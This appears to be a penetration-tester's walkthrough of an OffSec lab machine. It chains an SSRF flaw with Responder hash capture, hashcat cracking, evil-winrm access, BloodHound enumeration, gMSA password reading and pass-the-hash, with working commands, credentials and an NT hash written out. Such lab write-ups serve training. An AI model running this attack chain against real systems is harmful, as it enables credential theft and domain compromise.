# Enumeration
## Port 8080

#### -Navigated to "http://192.168.231.165:8080/" and found the following webpage:

![](Pasted%20image%2020221012174609.png)


#### -Typed "updog -p 445" on kali machine to fire up an HTTP Server

#### - Typed "http://[Kali IP]:445" into the "Enter URL" bar and clicked the search icon

![](Pasted%20image%2020221012174728.png)

#### - I was able to access my server. This confirmed that this server is vulnerable to SSRF

![](Pasted%20image%2020221012174847.png)
![](Pasted%20image%2020221012180025.png)
#SSRFvulnerability

#### - Clicking on any of my files makes the URL try to navigate to it as a sub directory off of the main page; for example clicking on utils.py file brings us to "http://192.168.231.165:8080/utils.py" which obviously doesn't exist:

![](Pasted%20image%2020221012181158.png)

#### - However, by adding the filename in the initial search it reads the file I select but does not execute it.

![](Pasted%20image%2020221012181305.png)

![](Pasted%20image%2020221012181352.png)

#### - It appears we will not be able to get command execution by accessing files on our web server directly; however, the second part of the description on SSRF attacks above seems interesting: In some cases, an SSRF vulnerability may allow an attacker to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. 

#### A specific tool that can be used to intercept authorization credentials when an arbitrary connection is made to a system is **Responder**.

#### - With this information, we should be able to setup Responder to create a spoofed WPAD proxy server and then search for an arbitrary domain using the URL search bar on the web server. After the request is made, we should see responder intercept the request and dump the hash of the user who owns the webserver.

---

# Exploitation
## Recieve username and NetNTLMv2 hashed password utilizing Responder

#### - Fire up Responder with the following command:

responder -I tun0 -wv

#responder

#### - Next, we need to send a request to our IP on a port that is not open and we should get a hash in our Responder window. For this example, I just forwarded the request to my IP without specifying a port since my web server is on port 445 and this request will target port 80, which is not open.

![](Pasted%20image%2020221012181516.png)

#### - After sending the request we receive a NetNTLMv2 hash for the user **enox** comes in to our Responder output.

![](Pasted%20image%2020221012181626.png)

#### - Copy the entire hash including the username and use a text editor to paste it into a file named hash.txt. After that, use the following commands to find the cracking mode needed for this hash type and then to begin cracking it:

hashcat -h | grep -i "ntlmv2"
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

#### - After no time at all, the hash is cracked and the password extracted from the cracked.txt file we output the results into.

#### - Cat "cracked.txt" file which shows username enox and password california


#### - Typed crackmapexec winrm 192.168.123.165 -d heist.offsec -u enox -p california -x "whoami" and found user "heist/enox" is running on the target machine:


![](Pasted%20image%2020221012181836.png)


#### - Typed "evil-winrm -i 192.168.123.165 -u enox -p california" and received the below winrm shell:

# Lateral Movement to user
## Local Enumeration

#### - Typed "net user enox" and noted current user "enox" is a part of "Web Admins" group memberships

#### - Attempted to enumerate Privelege Escalation vectors by utilizing PowerUp.ps1 and other privilege escalation scripts but found nothing

#### - Typed "sudo neo4j console"  on my kali machine and logged into the console using my neo4j credentials

#### - Navigated to another terminal on my kali machine and typed "bloodhound" and logged into bloodhound utilizing my neo4j credentials

#### - Navigated back to another terminal session on my kali machine and typed "bloodhound-python -u enox -p california -ns 192.168.81.165 -d heist.offsec -c all" and retreived the following computers, domains, groups and users information in .json format from the target machine in order to upload the information to bloodhound:

![](Pasted%20image%2020221012214003.png)

#### - Navigated to bloodhound and clicked "upload data". Then highlighted all the .json files and clicked open.  The target machines actived directory information was uploaded to bloodhound.

#### - Clicked the hamburger icon in the upper left hand corner of bloodhound and then clicked the "Analysis"tab to see a list of pre-built queries.

#### - Going from the bottom up on this list, nothing was providing data until I got toÂ **Shortest Paths to High Value Targets**, which revealed nothing interesting about my current user; however, it did show some interesting info on the service account.

#ADservicecanreadGMSApassword #GMSA #GroupManagedServiceAccount

#### - This shows that the **svc_apache** service account can read the GMSA password, which means that the **svc_apache** account is a Group Managed Service Account (gMSA).

#### - Using the following PowerShell command, we can confirm that this account is a service account with GMSA enabled:

Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}

![](Pasted%20image%2020221012214423.png)

#### - This shows that members of Web Admins group can retrieve the gMSA password. Earlier during the manual enumeration, we saw that our current user **enox** was a member of this group! This also shows that the svc_apache account is in the remote users group, which means that once we extract the gMSA password, we can remote in with this account using evil-winrm.

#### - Just to be certain, we can double check that our user is in the Web Admins group using the following command:

Get-ADGroupMember 'Web Admins'

#### - Downloaded the GMSAPasswordReader.exe precompiled binary to target machine

#### - Typed .\GMSAPasswordReader.exe --AccountName 'svc_apache' and retreived the following  NTLM hash:

#### - The rc4_hmac hash is the same as the NT hash, they are interchangeable.
#rc4_hmac

#### - Typed evil-winrm -i 192.168.81.165 -u svc_apache$ -H 4283B392D3647F3F26D614EE3AB9A80C and received a winrm login session as user svc_apache$
